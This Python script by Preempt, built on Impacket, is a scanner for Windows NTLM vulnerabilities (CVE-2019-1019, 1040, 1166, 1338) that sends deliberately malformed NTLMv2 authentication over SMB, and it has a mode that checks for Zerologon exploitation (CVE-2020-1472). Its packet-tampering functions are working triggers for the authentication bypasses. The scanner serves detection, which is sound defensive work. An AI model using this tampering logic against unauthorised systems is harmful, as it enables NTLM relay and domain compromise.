#!/usr/bin/env python
####################
#
# Copyright (c) 2020 Yaron Zinar / Preempt (@YaronZi)
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# Checks for several NTLM vulnerabilities (CVE-2019-1019, CVE-2019-1040,
# CVE-2019-1166, CVE-2019-1338) over SMB. The script will establish a connection
# to the target host(s) and send an invalid NTLM authentication.
# If this is accepted, the host is vulnerable to the scanned vulnerability and you can
# execute the the relevant attack.
#
# See:
# https://www.preempt.com/blog/drop-the-mic-cve-2019-1040/
# https://www.preempt.com/blog/drop-the-mic-2-active-directory-open-to-more-ntlm-attacks/
# for more info.
#
# Authors:
#  Yaron Zinar (@YaronZi)
#
# Software is based on the following:
# - CVE-2019-1040 scanner (https://github.com/fox-it/cve-2019-1040-scanner) by Dirk-jan Mollema (@_dirkjan)
# - Impacket (https://github.com/SecureAuthCorp/impacket) by SecureAuth Corporation (https://www.secureauth.com/)
#
####################
import sys
import logging
import argparse
import codecs
import calendar
import struct
import time
import datetime
import random
from impacket import version
from impacket.krb5.asn1 import seq_set, seq_set_iter, EncryptedData, KERB_PA_PAC_REQUEST, PA_ENC_TS_ENC, AS_REQ
from impacket.krb5.kerberosv5 import sendReceive
from impacket.examples.logger import ImpacketFormatter
from impacket.smbconnection import SMBConnection, SessionError
from impacket.krb5.types import Principal, KerberosTime
from pyasn1.codec.der import encoder, decoder
from impacket.krb5 import constants
from impacket.smb3structs import *
from impacket.krb5.crypto import Key, _enctype_table
from impacket import ntlm
from impacket.ntlm import AV_PAIRS, NTLMSSP_AV_EOL, NTLMSSP_AV_TIME, NTLMSSP_AV_FLAGS, NTOWFv2, NTLMSSP_AV_TARGET_NAME, NTLMSSP_AV_HOSTNAME,USE_NTLMv2, hmac_md5
from pyasn1.type.univ import noValue

def verify_kerberos_password(user, password, domain, kdc_host=None, request_pac=True, host_names=None, source_ip=None):
    host_names = host_names or []
    clientName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    domain = domain.upper()
    serverName = Principal("krbtgt/%s" % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    pacRequest = KERB_PA_PAC_REQUEST()
    pacRequest["include-pac"] = request_pac
    encodedPacRequest = encoder.encode(pacRequest)

    enctype = constants.EncryptionTypes.rc4_hmac.value
    encryptionTypesData = None # RC4 doesn"t have salt
    cipher = _enctype_table[enctype]

    salt = encryptionTypesData[enctype] if encryptionTypesData else ''
    key = cipher.string_to_key(password, salt, None)

    # Let"s build the timestamp
    timeStamp = PA_ENC_TS_ENC()

    now = datetime.datetime.utcnow()
    timeStamp["patimestamp"] = KerberosTime.to_asn1(now)
    timeStamp["pausec"] = now.microsecond

    encodedTimeStamp = encoder.encode(timeStamp)

    # Key Usage 1
    # AS-REQ PA-ENC-TIMESTAMP padata timestamp, encrypted with the
    # client key (Section 5.2.7.2)
    encriptedTimeStamp = cipher.encrypt(key, 1, encodedTimeStamp, None)

    encryptedData = EncryptedData()
    encryptedData["etype"] = cipher.enctype
    encryptedData["cipher"] = encriptedTimeStamp
    encodedEncryptedData = encoder.encode(encryptedData)

    # Now prepare the new AS_REQ again with the PADATA
    # ToDo: cannot we reuse the previous one?
    asReq = AS_REQ()

    asReq['pvno'] = 5
    asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

    asReq['padata'] = noValue
    asReq['padata'][0] = noValue
    asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_ENC_TIMESTAMP.value)
    asReq['padata'][0]['padata-value'] = encodedEncryptedData

    asReq['padata'][1] = noValue
    asReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
    asReq['padata'][1]['padata-value'] = encodedPacRequest

    reqBody = seq_set(asReq, 'req-body')

    opts = list()
    opts.append(constants.KDCOptions.forwardable.value)
    opts.append(constants.KDCOptions.renewable.value)
    opts.append(constants.KDCOptions.proxiable.value)
    reqBody["kdc-options"] = constants.encodeFlags(opts)

    seq_set(reqBody, "sname", serverName.components_to_asn1)
    seq_set(reqBody, "cname", clientName.components_to_asn1)

    reqBody["realm"] = domain

    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
    reqBody["till"] = KerberosTime.to_asn1(now)
    reqBody["rtime"] = KerberosTime.to_asn1(now)
    reqBody["nonce"] = random.getrandbits(31)

    seq_set_iter(reqBody, "etype", ((int(cipher.enctype),)))

    try:
        tgt = sendReceive(encoder.encode(asReq), domain, kdc_host)
    except Exception, e:
        if str(e).find('KDC_ERR_PREAUTH_FAILED') >= 0:
            return False
        raise

    return True


class mod_AV_PAIRS:
    def __init__(self, data = None):
        self.fields = {}
        if data is not None:
            self.fromString(data)

    def __setitem__(self,key,value):
        self.fields[key] = value

    def __getitem__(self, key):
        if key in self.fields:
           return self.fields[key]
        return None

    def __delitem__(self, key):
        del self.fields[key]

    def __len__(self):
        return len(self.getData())

    def __str__(self):
        return len(self.getData())

    def fromString(self, data):
        tInfo = data
        fType = 0xff
        while fType is not NTLMSSP_AV_EOL:
            fType = struct.unpack('<H',tInfo[:struct.calcsize('<H')])[0]
            tInfo = tInfo[struct.calcsize('<H'):]
            length = struct.unpack('<H',tInfo[:struct.calcsize('<H')])[0]
            tInfo = tInfo[struct.calcsize('<H'):]
            content = tInfo[:length]
            self.fields[fType]=[content]
            tInfo = tInfo[length:]

    def dump(self):
        for i in list(self.fields.keys()):
            print("%s: {%r}" % (i,self[i]))

    def getData(self):
        if NTLMSSP_AV_EOL in self.fields:
            del self.fields[NTLMSSP_AV_EOL]
        ans = b''
        for i in list(self.fields.keys()):
            for val in self[i]:
                ans+= struct.pack('<HH', i, len(val))
                ans+= val

        # end with a NTLMSSP_AV_EOL
        ans += struct.pack('<HH', NTLMSSP_AV_EOL, 0)

        return ans

# Slightly modified version of impackets computeResponseNTLMv2
def mod_cve20191040_computeResponseNTLMv2(flags, serverChallenge, clientChallenge, serverName, domain, user, password, lmhash='',
                              nthash='', use_ntlmv2=USE_NTLMv2, check=False):

    return mod_computeResponseNTLMv2(flags, serverChallenge, clientChallenge, serverName, domain, user, password, lmhash='',
                                  nthash='', use_ntlmv2=USE_NTLMv2, check=False, vuln="CVE-2019-1040")

# Slightly modified version of impackets computeResponseNTLMv2
def mod_cve20191166_computeResponseNTLMv2(flags, serverChallenge, clientChallenge, serverName, domain, user, password, lmhash='',
                              nthash='', use_ntlmv2=USE_NTLMv2, check=False):

    return mod_computeResponseNTLMv2(flags, serverChallenge, clientChallenge, serverName, domain, user, password, lmhash='',
                                  nthash='', use_ntlmv2=USE_NTLMv2, check=False, vuln="CVE-2019-1166")

# Slightly modified version of impackets computeResponseNTLMv2
def mod_cve20191338_computeResponseNTLMv2(flags, serverChallenge, clientChallenge, serverName, domain, user, password, lmhash='',
                              nthash='', use_ntlmv2=USE_NTLMv2, check=False):

    return mod_computeResponseNTLMv2(flags, serverChallenge, clientChallenge, serverName, domain, user, password, lmhash='',
                                  nthash='', use_ntlmv2=USE_NTLMv2, check=False, vuln="CVE-2019-1338")

def mod_computeResponseNTLMv2(flags, serverChallenge, clientChallenge, serverName, domain, user, password, lmhash='',
                              nthash='', use_ntlmv2=USE_NTLMv2, check=False, vuln="CVE-2019-1040"):

    responseServerVersion = b'\x01'
    hiResponseServerVersion = b'\x01'
    responseKeyNT = NTOWFv2(user, password, domain, nthash)

    av_pairs = mod_AV_PAIRS(serverName)
    av_pairs[NTLMSSP_AV_TARGET_NAME] = ['cifs/'.encode('utf-16le') + av_pairs[NTLMSSP_AV_HOSTNAME][0]]
    if av_pairs[NTLMSSP_AV_TIME] is not None:
        aTime = av_pairs[NTLMSSP_AV_TIME][0]
    else:
        aTime = struct.pack('<q', (116444736000000000 + calendar.timegm(time.gmtime()) * 10000000))
        av_pairs[NTLMSSP_AV_TIME] = [aTime]

    if vuln == "CVE-2019-1040":
        av_pairs[NTLMSSP_AV_FLAGS] = [b'\x02' + b'\x00' * 3]
    if vuln == "CVE-2019-1166":
        av_pairs[NTLMSSP_AV_FLAGS] = [b'\x02' + b'\x00' * 3, b'\x00' * 4]
    serverName = av_pairs.getData()

    temp = responseServerVersion + hiResponseServerVersion + b'\x00' * 6 + aTime + clientChallenge + b'\x00' * 4 + \
           serverName + b'\x00' * 4

    md5_temp = temp
    if vuln == "CVE-2019-1338":
        md5_temp = responseServerVersion + hiResponseServerVersion + b'\x00' * 6 + aTime + clientChallenge + b'\x00' * 4 + \
                   serverName + b'\x01' * 4

    ntProofStr = hmac_md5(responseKeyNT, serverChallenge + md5_temp)

    ntChallengeResponse = ntProofStr + temp
    lmChallengeResponse = hmac_md5(responseKeyNT, serverChallenge + clientChallenge) + clientChallenge
    sessionBaseKey = hmac_md5(responseKeyNT, ntProofStr)

    return ntChallengeResponse, lmChallengeResponse, sessionBaseKey

orig_type1 = ntlm.getNTLMSSPType1
# Wrapper to remove signing flags
def mod_getNTLMSSPType1(workstation='', domain='', signingRequired = False, use_ntlmv2 = USE_NTLMv2):
    return orig_type1(workstation, domain, False, use_ntlmv2)

class checker(object):
    def __init__(self, username='', password='', domain='', port=None,
                 hashes=None, vuln='CVE-2019-1019'):

        self.__username = username
        self.__password = password
        self.__port = port
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')
        self.__vuln = vuln
        self.creds_validated = False

    def validate_creds(self, remote_host):
        try:
            smbClient = SMBConnection(remote_host, remote_host, sess_port=int(self.__port)) #, preferredDialect=SMB2_DIALECT_21
            smbClient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        except SessionError as exc:
            if 'STATUS_LOGON_FAILURE' in str(exc):
                logging.error('Error validating credentials - make sure the supplied credentials are correct')
            else:
                logging.warning('Unexpected Exception while validating credentials against {}: %s'.format(remote_host), exc)
            raise KeyboardInterrupt
        except:
            logging.error('Error during connection to {}. TCP/445 refused, timeout?'.format(remote_host))

    def check(self, remote_names):
        # Validate credentials first
        if not self.creds_validated:
            self.validate_creds(remote_names[0])
            self.creds_validated = True

        # CVE-2020-1472 scan is continuous
        if self.__vuln == "CVE-2020-1472":
            while True:
                for remote_host in remote_names:
                    if verify_kerberos_password(remote_host.split(".")[0]+"$", "", ".".join(remote_host.split(".")[1:]), remote_host):
                        logging.info('Target %s was exploited for CVE-2020-1472!', remote_host)
                    else:
                        logging.info('Target %s was not exploited', remote_host)
                    time.sleep(1)


        # Now start scanner
        for remote_host in remote_names:
            try:
                smbClient = SMBConnection(remote_host, remote_host, sess_port=int(self.__port)) #, preferredDialect=SMB2_DIALECT_21
            except:
                return
            try:
                # Both cve-2019-1019 and cve-2019-1040 were part of the same KB and can be checked
                # by using cve-2019-1040 can logic
                if self.__vuln in ["CVE-2019-1019", "CVE-2019-1040"]:
                    ntlm.computeResponseNTLMv2 = mod_cve20191040_computeResponseNTLMv2
                if self.__vuln == "CVE-2019-1166":
                    ntlm.computeResponseNTLMv2 = mod_cve20191166_computeResponseNTLMv2
                if self.__vuln == "CVE-2019-1338":
                    ntlm.computeResponseNTLMv2 = mod_cve20191338_computeResponseNTLMv2
                smbClient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                logging.info('Target %s is VULNERABLE to %s (authentication was accepted)', remote_host, self.__vuln)
            except SessionError as exc:
                if 'STATUS_INVALID_PARAMETER' in str(exc) and self.__vuln in ["CVE-2019-1019", "CVE-2019-1040", "CVE-2019-1166"]:
                    logging.info('Target %s is not vulnerable to %s (authentication was rejected)', remote_host, self.__vuln)
                elif 'STATUS_LOGON_FAILURE' in str(exc) and self.__vuln == "CVE-2019-1338":
                    logging.info('Target %s is not vulnerable to %s (authentication was rejected)', remote_host, self.__vuln)
                else:
                    logging.warning('Unexpected Exception while authenticating to %s: %s', remote_host, exc)

            smbClient.close()

# Process command-line arguments.
def main():
    # Init the example's logger theme
    handler = logging.StreamHandler(sys.stderr)
    handler.setFormatter(ImpacketFormatter())
    logging.getLogger().addHandler(handler)
    logging.getLogger().setLevel(logging.INFO)

    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    logging.info('NTLM vulnerabilities scanner by @YaronZi / Preempt - Based on impacket by SecureAuth')

    parser = argparse.ArgumentParser(description="NTLM scanner - Connects over SMB and attempts to authenticate "
                                                 "with invalid NTLM packets. If accepted, target is vulnerable to the scanned vulnerability")

    parser.add_argument('-target', action='store', help='[[domain/]username[:password]@]<targetName or address>')

    group = parser.add_argument_group('connection')

    group.add_argument('-target-file',
                       action='store',
                       metavar="file",
                       help='Use the targets in the specified file instead of the one on'\
                            ' the command line (you must still specify something as target name)')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
    group.add_argument('-vuln', choices=['CVE-2019-1019', 'CVE-2019-1040', 'CVE-2019-1166', 'CVE-2019-1338', 'CVE-2020-1472'],
                       nargs='?', default='CVE-2019-1019', metavar="scanned vulnerability",
                       help='The vulnerability to scan SMB Server on [CVE-2019-1019|CVE-2019-1040|CVE-2019-1166|CVE-2019-1338|CVE-2020-1472]')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    import re

    domain = ""
    username = ""
    password = ""
    remote_name = ""
    if options.target is not None:
        domain, username, password, remote_name = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')
    else:
        if options.target_file is None:
            logging.error("Please supply a target")
            return
        if options.vuln != "CVE-2020-1472":
            logging.error("Please supply a username/password (you can't use this scanner with anonymous authentication)")
            return

    #In case the password contains '@'
    if '@' in remote_name:
        password = password + '@' + remote_name.rpartition('@')[0]
        remote_name = remote_name.rpartition('@')[2]

    if domain is None:
        domain = ''

    remote_names = []
    creds_validated = False
    if options.vuln != "CVE-2020-1472":
        if password == '' and username == '':
            logging.error("Please supply a username/password (you can't use this scanner with anonymous authentication)")
            return

        if password == '' and username != '' and options.hashes is None:
            from getpass import getpass
            password = getpass("Password:")
    else:
        creds_validated = True

    if options.target_file is not None:
        with open(options.target_file, 'r') as inf:
            for line in inf:
                remote_names.append(line.strip())
    else:
        remote_names.append(remote_name)

    lookup = checker(username, password, domain, int(options.port), options.hashes, options.vuln)
    lookup.creds_validated = creds_validated
    lookup.check(remote_names)


if __name__ == '__main__':
    main()
